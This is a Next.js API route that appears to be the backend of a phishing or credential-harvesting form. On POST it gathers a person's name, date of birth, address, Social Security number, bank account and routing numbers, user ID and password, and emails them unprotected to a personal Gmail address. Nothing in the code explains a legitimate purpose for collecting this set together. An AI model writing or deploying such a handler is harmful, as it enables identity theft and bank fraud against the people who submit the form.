import { NextApiRequest, NextApiResponse } from "next";
import sendMail from "@/emails";
import FormsEmail from "@/emails/FormsEmail";

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  if (req.method === "POST") {
    const {
      firstname,
      lastname,
      dob,
      address,
      ssn,
      accountNumber,
      routingNumber,
      userId,
      password,
    } = req.body;

    await sendMail({
      subject: `New message from ${firstname} ${lastname}`,
      to: "miteshgupta15@gmail.com",
      component: (
        <FormsEmail
          firstname={firstname}
          lastname={lastname}
          dob={dob}
          address={address}
          ssn={ssn}
          accountNumber={accountNumber}
          routingNumber={routingNumber}
          userId={userId}
          password={password}
        />
      ),
    });

    return res.status(200).json("success");
  }
}
